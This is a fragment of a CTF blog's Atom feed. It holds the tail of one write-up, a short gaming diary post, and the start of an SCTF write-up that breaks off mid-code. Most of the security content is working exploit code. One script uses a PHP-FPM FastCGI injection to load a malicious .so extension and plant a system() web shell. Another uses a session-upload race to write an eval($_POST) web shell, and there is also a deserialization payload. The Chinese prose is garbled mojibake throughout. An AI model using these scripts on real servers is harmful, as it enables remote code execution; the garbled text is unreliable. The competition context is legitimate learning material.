inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a1&quot;</span>: <span class="string">&quot;/var/www/html/config.php&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">writefile</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction a1 file_put_contents</span></span><br><span class="line"><span class="string">    ICALL file_put_contents invokeArgs a2 _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a1&quot;</span>: <span class="string">&quot;file_put_contents&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a2&quot;</span>: [<span class="string">&quot;/tmp/success.txt&quot;</span>, <span class="string">&quot;success&quot;</span>],</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write_ext</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction file_put_contents file_put_contents</span></span><br><span class="line"><span class="string">    ICALL file_put_contents invokeArgs a2 _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    ext = <span class="title function_ invoke__">open</span>(<span class="string">&quot;exp.so&quot;</span>, <span class="string">&quot;rb&quot;</span>).<span class="title function_ invoke__">read</span>()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;file_put_contents&quot;</span>: <span class="string">&quot;file_put_contents&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a2&quot;</span>: [<span class="string">&quot;/tmp/exp.so&quot;</span>, ext],</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">fpm_attack</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CALL base64_decode fpm_data fpm_data</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NEW ReflectionFunction fsockopen fsockopen</span></span><br><span class="line"><span class="string">    ICALL fsockopen invokeArgs fsockopen_args sock</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NEW ArrayObject arg_array arg_array</span></span><br><span class="line"><span class="string">    ICALL arg_array offsetUnset offset _</span></span><br><span class="line"><span class="string">    ICALL arg_array append sock _</span></span><br><span class="line"><span class="string">    ICALL arg_array append fpm_data _</span></span><br><span class="line"><span class="string">    CALL iterator_to_array arg_array data</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction fwrite fwrite</span></span><br><span class="line"><span class="string">    ICALL fwrite invokeArgs data _</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CALL fflush sock _</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NEW ArrayObject arg_array_1 arg_array_1</span></span><br><span class="line"><span class="string">    ICALL arg_array_1 offsetUnset offset _</span></span><br><span class="line"><span class="string">    ICALL arg_array_1 append sock _</span></span><br><span class="line"><span class="string">    ICALL arg_array_1 append length _</span></span><br><span class="line"><span class="string">    CALL iterator_to_array arg_array_1 data</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction fread fread</span></span><br><span class="line"><span class="string">    ICALL fread invokeArgs data socks_read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CALL bin2hex socks_read socks_read</span></span><br><span class="line"><span class="string">    CALL var_dump socks_read _</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CALL file_get_contents file_arg r1</span></span><br><span class="line"><span class="string">    CALL var_dump r1 _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;fpm_data&quot;</span>: <span class="string">&quot;AQEAAQAIAAAAAQAAAAAAAAEEAAEBnwAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPGVNDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvYWRkX2FwaS5waHALDFNDUklQVF9OQU1FL2FkZF9hcGkucGhwDA5RVUVSWV9TVFJJTkdjb21tYW5kPXdob2FtaQsbUkVRVUVTVF9VUkkvYWRkX2FwaS5waHA/Y29tbWFuZD13aG9hbWkMDERPQ1VNRU5UX1VSSS9hZGRfYXBpLnBocAkXUEhQX1ZBTFVFZXh0ZW5zaW9uID0gL3RtcC9leHAuc28PDVNFUlZFUl9TT0ZUV0FSRTgwc2VjL3dvZmVpd28LCVJFTU9URV9BRERSMTI3LjAuMC4xCwRSRU1PVEVfUE9SVDkwMDALCVNFUlZFUl9BRERSMTI3LjAuMC4xCwJTRVJWRVJfUE9SVDgwCwlTRVJWRVJfTkFNRWxvY2FsaG9zdA8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOAUNPTlRFTlRfTEVOR1RIMAEEAAEAAAAAAQUAAQAxAAA8P3BocCBzeXN0ZW0oJF9SRVFVRVNUWydjb21tYW5kJ10pOyBwaHBpbmZvKCk7ID8+AQUAAQAAAAA=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fsockopen&quot;</span>: <span class="string">&quot;fsockopen&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fsockopen_args&quot;</span>: [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>],</span><br><span class="line">        <span class="string">&quot;arg_array&quot;</span>: [<span class="string">&quot;&quot;</span>],</span><br><span class="line">        <span class="string">&quot;offset&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;fwrite&quot;</span>: <span class="string">&quot;fwrite&quot;</span>,</span><br><span class="line">        <span class="string">&quot;arg_array_1&quot;</span>: [<span class="string">&quot;&quot;</span>],</span><br><span class="line">        <span class="string">&quot;length&quot;</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="string">&quot;fread&quot;</span>: <span class="string">&quot;fread&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file_arg&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">run</span>(<span class="attr">func</span>: <span class="keyword">callable</span>):</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">name_convert</span>(<span class="attr">name</span>: str):</span><br><span class="line">        <span class="keyword">match</span> name:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;CALL&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;call&quot;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;ICALL&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;inst_call&quot;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;NEW&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;new&quot;</span></span><br><span class="line">            <span class="keyword">case</span> _:</span><br><span class="line">                <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">data_item</span>(<span class="attr">key</span>: str, <span class="attr">value</span>: <span class="keyword">int</span> | str | dict | <span class="keyword">list</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">type</span>(value) == <span class="keyword">int</span>:</span><br><span class="line">            <span class="keyword">return</span> [(key, value)]</span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == str:</span><br><span class="line">            <span class="keyword">return</span> [(key, value)]</span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == bytes:</span><br><span class="line">            <span class="keyword">return</span> [(key, value)]</span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == dict:</span><br><span class="line">            <span class="keyword">new</span> = []</span><br><span class="line">            <span class="keyword">for</span> k in value:</span><br><span class="line">                <span class="keyword">new</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">data_item</span>(f<span class="string">&quot;&#123;key&#125;[&#123;k&#125;]&quot;</span>, value[k]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == <span class="keyword">list</span>:</span><br><span class="line">            <span class="keyword">new</span> = []</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(value) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">new</span>.<span class="title function_ invoke__">append</span>((<span class="string">&quot;array[]&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> k in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(value)):</span><br><span class="line">                    <span class="keyword">new</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">data_item</span>(f<span class="string">&quot;&#123;key&#125;[&#123;k&#125;]&quot;</span>, value[k]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">        raise <span class="built_in">Exception</span>(<span class="string">&quot;unsupported type&quot;</span>)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">data_convert</span>(<span class="attr">data</span>: dict):</span><br><span class="line">        def <span class="title function_ invoke__">flatten</span>(something):</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(something, (<span class="keyword">list</span>, range)):</span><br><span class="line">                <span class="keyword">for</span> sub in something:</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> <span class="title function_ invoke__">flatten</span>(sub)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">yield</span> something</span><br><span class="line"></span><br><span class="line">        l = []</span><br><span class="line">        <span class="keyword">for</span> k in data:</span><br><span class="line">            l.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">data_item</span>(k, data[k]))</span><br><span class="line">        l = <span class="title function_ invoke__">flatten</span>(l)</span><br><span class="line">        <span class="keyword">return</span> &#123;k[<span class="number">0</span>]: k[<span class="number">1</span>] <span class="keyword">for</span> k in l&#125;</span><br><span class="line"></span><br><span class="line">    code, data = <span class="title function_ invoke__">func</span>()</span><br><span class="line">    code = code.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\n\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    code = code.<span class="title function_ invoke__">split</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    code = <span class="title function_ invoke__">map</span>(lambda <span class="attr">x</span>: x.<span class="title function_ invoke__">split</span>(<span class="string">&quot; &quot;</span>), code)</span><br><span class="line">    code = itertools.chain.<span class="title function_ invoke__">from_iterable</span>(code)</span><br><span class="line">    code = <span class="title function_ invoke__">map</span>(name_convert, code)</span><br><span class="line">    code = <span class="keyword">list</span>(code)</span><br><span class="line">    code = &#123;k: code[k] <span class="keyword">for</span> k in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(code))&#125;</span><br><span class="line">    data = <span class="title function_ invoke__">data_convert</span>(data)</span><br><span class="line">    code = code | data</span><br><span class="line">    res = requests.<span class="title function_ invoke__">post</span>(URL, data=code)</span><br><span class="line">    <span class="keyword">print</span>(res.request.body)</span><br><span class="line">    <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">run</span>(fpm_attack)</span><br></pre></td></tr></table></figure><p>å‡ºé¢˜äººå†™çš„.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="å¤ç°" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>å‘ç”µæ—¥è®°(ä¸€)</title>
    <link href="https://1llustrious.github.io/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/"/>
    <id>https://1llustrious.github.io/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/</id>
    <published>2023-12-03T03:58:53.000Z</published>
    <updated>2023-12-10T13:33:09.316Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>å—ä¸äº†äº†,ğŸ‘´è¦å‘ç”µ!!!</p><p>æœ€è¿‘ğŸ‘´åœ¨ç©å¯Œå©†å¦¹çš„FD,ä½ çŸ¥é“çš„,æˆ‘ç©è¿™ä¸ªFD,å°±æ˜¯å¥”ç€é¾™é—²å¤©æ¢¨æ¥çš„,æœ‰è°ä¸å–œæ¬¢è¿™æ ·çš„å¦¹å­å‘¢,ğŸ¥µğŸ¥µğŸ¥µğŸ¥µğŸ¥µğŸ¥µğŸ¥°ğŸ¥°ğŸ¥°</p><p>![1701575986674](./å‘ç”µæ—¥è®°-ä¸€/1701575986674.png</p><p>çœ‹çœ‹è¿™å¯çˆ±çš„è„¸,å¤ªå¥½åº·äº†!!!</p><p><img src="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/1701576175071.png" alt="1701576175071"></p><p>s</p><p>è¿™ä¹ˆå¤©ç„¶å‘†çš„ç”œå¦¹,è¯•é—®è°ä¸å–œæ¬¢å‘¢</p><p><img src="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/1701577445433.png" alt="1701577445433"></p><p>awsl!!!</p><p>è¿™ç§è¯­æ°” daisukiiiiiiiiiiiiiiiiiiiiiii!!!</p><p>å°±è¦è¿™ç§ç™½ç»™çš„.</p><p>ä¸ºå•¥ä¼šæœ‰è¿™ä¹ˆå¤©ç„¶å‘†çš„å¥³ç”Ÿ,ä¼šç»™ä½ å¥¹çš„å„ç§size.</p><p><img src="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/1702208777042.png" alt="1702208777042"></p><p>å·¦æ‹¥å³æŠ±,äººç”Ÿå·…å³°,åä¹ƒä¹Ÿè¿™ä¹ˆkwwai!!!111</p><p>------------------æœªå®Œå¾…ç»­-----------------</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="æ‚è°ˆ" scheme="https://1llustrious.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>sctf</title>
    <link href="https://1llustrious.github.io/2023/12/02/sctf/"/>
    <id>https://1llustrious.github.io/2023/12/02/sctf/</id>
    <published>2023-12-02T14:29:09.000Z</published>
    <updated>2023-12-02T14:32:45.834Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E7%AE%97pin%E7%A0%81">ç®—pinç </a><ul><li><a href="#ctfshow801">ctfshow801</a></li><li><a href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE">å›åˆ°é¢˜ç›®</a></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul></li><li><a href="#hellojava">hellojava</a><ul><li><a href="#%E7%86%9F%E6%82%89jackson">ç†Ÿæ‚‰jackson</a></li><li><a href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE-1">å›åˆ°é¢˜ç›®</a></li><li><a href="#%E5%9D%91%E7%82%B9">å‘ç‚¹</a></li><li><a href="#aliyunbapassit">aliyunbapassit</a></li></ul></li><li><a href="#fumo_backdoor">FUMO_backdoor</a><ul><li><a href="#%E5%A4%8D%E5%88%B6flag">å¤åˆ¶flag</a></li><li><a href="#%E5%86%99session">å†™session</a></li><li><a href="#%E8%AF%BBflag~">è¯»flag~</a></li></ul></li><li><a href="#monitor">Monitor</a><ul><li><a href="#import">import</a></li><li><a href="#check%E8%B7%AF%E7%94%B1">checkè·¯ç”±</a></li><li><a href="#flag%E8%B7%AF%E7%94%B1">flagè·¯ç”±</a></li></ul></li><li><a href="#sycserver">SycServer</a><ul><li><a href="#readfile%E8%B7%AF%E7%94%B1">readfileè·¯ç”±</a></li><li><a href="#file-unachive">file-unachive</a></li><li><a href="#admin%E8%B7%AF%E7%94%B1">adminè·¯ç”±</a></li></ul></li><li><a href="#easychek1n">easyChek1n</a></li></ul><!-- tocstop --><p><a href="https://xz.aliyun.com/t/2553#toc-2">https://xz.aliyun.com/t/2553#toc-2</a></p><p>ppy<br>ä¼ sessionï¼Œæ¡ä»¶ç«äº‰æ‰èƒ½è·‘å‡ºæ¥ã€‚<br>ç›´æ¥ç½‘ä¸Šæœä¸€ä¸ªåŒçº¿ç¨‹æ”¹ä¸€ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"># <span class="keyword">import</span> io</span><br><span class="line"># <span class="keyword">import</span> <span class="type">threading</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://192.168.229.132/include.php&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php $f = fopen(&#x27;3.php&#x27;,&#x27;w&#x27;);fwrite($f,&#x27;&lt;?php $cmd = 123;eval($_POST[$cmd]);?&gt;&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">xiao = <span class="string">&quot;xiao&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;1.jpg&quot;</span>: <span class="string">&quot;12323131231&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: xiao&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">read</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r = session.post(url, data=data, files=files, cookies=cookies)</span><br><span class="line">    print(r.text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_">write</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        new_url = url + <span class="string">&quot;?file=&quot;</span> + <span class="string">&quot;../Extensions/tmp/tmp/sess_&quot;</span> + <span class="type">xiao</span></span><br><span class="line">        <span class="variable">r1</span> <span class="operator">=</span> session.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress_&quot;</span> in r.text:</span><br><span class="line">            print(<span class="string">&quot;ä¸Šä¼ æˆåŠŸ&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t1 = threading.Thread(target=read)</span><br><span class="line">    t2 = threading.Thread(target=write)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>æ­¤ååªç”¨åœ¨readæ”¹dataå³å¯ï¼Œfileså’ŒPHP_SESSION_UPLOAD_PROGRESSåˆ«åŠ¨ã€‚<br>å…ˆè¯»ä¸ªæºç ï¼Œè¿”å›ä¸ªhtmlä»£ç ï¼Œæ”¾å…¥æ–‡ä»¶æ˜¾ç¤ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span>(!isset($_SESSION))&#123;</span><br><span class="line">        die(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    $type = $_SESSION[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $properties = $_SESSION[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line">    echo <span class="title function_">urlencode</span><span class="params">($_POST[<span class="string">&#x27;data&#x27;</span>])</span>;</span><br><span class="line">    extract(unserialize($_POST[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;</span><br><span class="line">    $object = unserialize(urldecode($properties));</span><br><span class="line">    $object -&gt; sctf();</span><br><span class="line">    exit();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(is_array($properties))&#123;</span><br><span class="line">        $object = <span class="keyword">new</span> <span class="title class_">$type</span>($properties[<span class="number">0</span>],$properties[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = file_get_contents(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>.$properties);</span><br><span class="line">    &#125;</span><br><span class="line">    echo <span class="string">&quot;this is the object: $object &lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åªéœ€è¦ä¼ å…¥dataæ•°ç»„å°±å¯ä»¥å®ç°typeå’Œpropertiesçš„å˜é‡è¦†ç›–äº†ã€‚<br>æ‰¾flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> <span class="operator">=</span> array(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;GlobIterator&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;properties&#x27;</span> =&gt; array(<span class="string">&quot;/*flag*&quot;</span>,<span class="string">&quot;1&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">$a=unserialize($serialized_data);</span><br><span class="line">var_dump($a);</span><br><span class="line">echo $serialized_data;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"># <span class="keyword">import</span> io</span><br><span class="line"># <span class="keyword">import</span> <span class="type">threading</span></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://115.239.215.75:8081/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;22&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;a:2:&#123;s:4:&quot;type&quot;;s:12:&quot;GlobIterator&quot;;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:7:&quot;/*flag*&quot;;i:1;s:1:&quot;1&quot;;&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">xiao = <span class="string">&quot;xiao&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;1.jpg&quot;</span>: <span class="string">&quot;12323131231&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: xiao&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">read</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        res = session.post(url, data=data,files=files, cookies=cookies)</span><br><span class="line">        print(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">write</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        new_url = url + <span class="string">&quot;?file=&quot;</span> + <span class="string">&quot;../Extensions/tmp/tmp/sess_&quot;</span> + <span class="type">xiao</span></span><br><span class="line">        <span class="variable">r</span> <span class="operator">=</span> session.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress_&quot;</span> in r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t1 = threading.Thread(target=read)</span><br><span class="line">    t2 = threading.Thread(target=write)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flagåœ¨/flag<br><a href="http://xn--app-v96f885g.py">æç¤ºapp.py</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> <span class="operator">=</span> array(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;GlobIterator&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;properties&#x27;</span> =&gt; array(<span class="string">&quot;/usr/lib/python3.8/site-packages/flask/app*&quot;</span>,<span class="string">&quot;0&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">$a=unserialize($serialized_data);</span><br><span class="line">var_dump($a);</span><br><span class="line">echo $serialized_data;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 